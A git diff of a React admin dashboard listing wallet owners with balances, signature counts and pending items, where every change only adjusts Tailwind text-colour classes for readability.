@@ -214,7 +214,7 @@ export default function Admin() {
       <div className="mb-6 bg-white shadow p-5 rounded-lg border">
         <h2 className="text-lg font-semibold text-gray-700 mb-3">Global Settings</h2>
         <input
-          className="w-full px-3 py-2 border rounded-md"
+          className="w-full px-3 text-gray-700 py-2 border rounded-md"
           value={outputToken}
           onChange={(e) => setOutputToken(e.target.value)}
           placeholder="Output Token Address"
@@ -226,7 +226,7 @@ export default function Admin() {
         {Object.keys(groupedData).map(owner => (
           <div
             key={owner}
-            className="bg-white border shadow-sm rounded-lg p-5 cursor-pointer hover:shadow-md"
+            className="bg-white border shadow-sm rounded-lg p-5 text-gray-700 cursor-pointer hover:shadow-md"
             onClick={() => openModal(owner)}
           >
             <div className="font-mono text-gray-700 text-sm">
@@ -237,12 +237,12 @@ export default function Admin() {
               {balances[owner]} ETH • {tokenBalances[owner]} {tokenSymbol}
             </div>
 
-            <div className="mt-4 flex justify-between text-sm text-gray-600">
+            <div className="mt-4 flex justify-between text-sm text-gray-800">
               <div>Signatures</div>
               <div className="font-bold">{groupedData[owner].length}</div>
             </div>
 
-            <div className="flex justify-between text-sm text-gray-600 mt-1">
+            <div className="flex justify-between text-sm text-gray-800 mt-1">
               <div>Pending</div>
               <div className="font-bold text-yellow-600">
                 {groupedData[owner].filter(x => !x.processed).length}
@@ -254,7 +254,7 @@ export default function Admin() {
 
       {/* Modal */}
       {isModalOpen && selectedWallet && (
-        <div className="fixed inset-0 bg-black/40 flex items-center justify-center p-4">
+        <div className="fixed inset-0 bg-black/40 flex items-center text-black justify-center p-4">
           <div className="bg-white rounded-lg shadow-xl w-full max-w-lg p-6 relative">
 
             <div className="flex justify-between items-center mb-4">
@@ -305,7 +305,7 @@ export default function Admin() {
 
       {/* Settings Modal */}
       {isSettingsOpen && (
-        <div className="fixed inset-0 bg-black/40 flex items-center justify-center p-4">
+        <div className="fixed inset-0 text-black bg-black/40 flex items-center justify-center p-4">
           <div className="bg-white rounded-lg shadow-xl w-full max-w-md p-6 relative">
 
             <div className="flex justify-between items-center mb-4">
